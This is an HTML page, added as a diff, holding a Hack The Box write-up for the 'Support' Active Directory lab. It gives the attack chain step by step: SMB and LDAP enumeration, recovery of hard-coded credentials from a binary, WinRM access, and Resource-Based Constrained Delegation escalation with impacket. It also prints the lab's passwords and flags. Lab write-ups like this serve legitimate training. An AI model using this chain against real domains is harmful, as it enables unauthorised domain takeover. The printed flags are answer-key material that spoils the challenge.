@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Support - HTB Writeup</title>
+
+<style>
+body {
+  background: #0a0a0a;
+  color: #eaeaea;
+  font-family: Consolas, monospace;
+  margin: 0;
+}
+
+header {
+  text-align: center;
+  padding: 40px;
+  border-bottom: 1px solid #222;
+}
+
+h1 {
+  color: #00ff9c;
+}
+
+main {
+  max-width: 900px;
+  margin: auto;
+  padding: 20px;
+}
+
+.section {
+  margin-bottom: 50px;
+}
+
+h2 {
+  border-left: 4px solid #00ff9c;
+  padding-left: 10px;
+}
+
+h3 {
+  color: #00ff9c;
+}
+
+.cmd, .output {
+  background: #111;
+  padding: 10px;
+  border-radius: 6px;
+  margin: 10px 0;
+}
+
+.flag {
+  background: #111;
+  padding: 10px;
+  border-left: 4px solid #00ff9c;
+  margin-top: 10px;
+}
+</style>
+
+</head>
+<body>
+
+<header>
+  <h1>Support - Hack The Box Writeup</h1>
+  <p>Difficulty: Easy | Category: Active Directory</p>
+</header>
+
+<main>
+
+<div class="section">
+  <h2>Overview</h2>
+  <p>
+    Support is an Easy Windows machine simulating an Active Directory Domain Controller.
+    The attack chain involves SMB enumeration, .NET binary analysis, credential decryption,
+    LDAP enumeration, and privilege escalation via Resource-Based Constrained Delegation (RBCD).
+  </p>
+</div>
+
+<div class="section">
+  <h2>Reconnaissance</h2>
+
+  <h3>Host Discovery</h3>
+  <div class="cmd">ping -c 1 10.129.X.X</div>
+
+  <div class="output">
+    ttl=127 → Indicates Windows host
+  </div>
+
+  <h3>Port Scanning</h3>
+  <div class="cmd">
+nmap -sS -p- --open --min-rate 5000 -Pn -n 10.129.X.X
+  </div>
+
+  <div class="output">
+    53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), 5985 (WinRM)
+  </div>
+</div>
+
+<div class="section">
+  <h2>SMB Enumeration</h2>
+
+  <div class="cmd">smbclient -L //10.129.X.X -N</div>
+
+  <div class="output">
+    support-tools → Non-standard share (interesting)
+  </div>
+
+  <div class="cmd">
+smbclient //10.129.X.X/support-tools -N
+get UserInfo.exe.zip
+  </div>
+</div>
+
+<div class="section">
+  <h2>Binary Analysis</h2>
+
+  <div class="cmd">
+unzip UserInfo.exe.zip
+strings -e l UserInfo.exe
+  </div>
+
+  <div class="output">
+Encrypted password: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
+Key: armando
+User: support\ldap
+  </div>
+</div>
+
+<div class="section">
+  <h2>Password Decryption</h2>
+
+  <p>Password was XOR + Base64 encoded.</p>
+
+  <div class="output">
+    Decrypted password:
+    nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+  </div>
+</div>
+
+<div class="section">
+  <h2>LDAP Enumeration</h2>
+
+  <div class="cmd">
+ldapsearch -x -H ldap://10.129.X.X \
+-D 'support\ldap' \
+-w 'password'
+  </div>
+
+  <div class="output">
+    support user password found:
+    Ironside47pleasure40Watchful
+  </div>
+</div>
+
+<div class="section">
+  <h2>Initial Access (WinRM)</h2>
+
+  <div class="cmd">
+evil-winrm -i 10.129.X.X -u support -p Ironside47pleasure40Watchful
+  </div>
+
+  <div class="output">
+    Access as support user obtained
+  </div>
+
+  <div class="flag">
+    User Flag: 90ff758144e77feda1f79734e57b8abf
+  </div>
+</div>
+
+<div class="section">
+  <h2>Privilege Escalation (RBCD)</h2>
+
+  <p>
+    The user belongs to a group with GenericAll permissions over the Domain Controller,
+    allowing a Resource-Based Constrained Delegation attack.
+  </p>
+
+  <div class="cmd">
+impacket-addcomputer support.htb/support:'password'
+  </div>
+
+  <div class="cmd">
+Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount FAKE$
+  </div>
+
+  <div class="cmd">
+impacket-getST support.htb/FAKE$ -impersonate Administrator
+  </div>
+
+  <div class="cmd">
+impacket-psexec -k -no-pass support.htb/Administrator
+  </div>
+
+  <div class="output">
+    SYSTEM access obtained
+  </div>
+
+  <div class="flag">
+    Root Flag: d0b25369aadbc499f993e59be095b5ee
+  </div>
+</div>
+
+<div class="section">
+  <h2>Summary</h2>
+
+  <ul>
+    <li>SMB → Anonymous share access</li>
+    <li>Binary → Hardcoded encrypted credentials</li>
+    <li>XOR → Password decryption</li>
+    <li>LDAP → Password disclosure</li>
+    <li>WinRM → Initial foothold</li>
+    <li>RBCD → Privilege escalation to SYSTEM</li>
+  </ul>
+</div>
+
+</main>
+
+</body>
+</html>
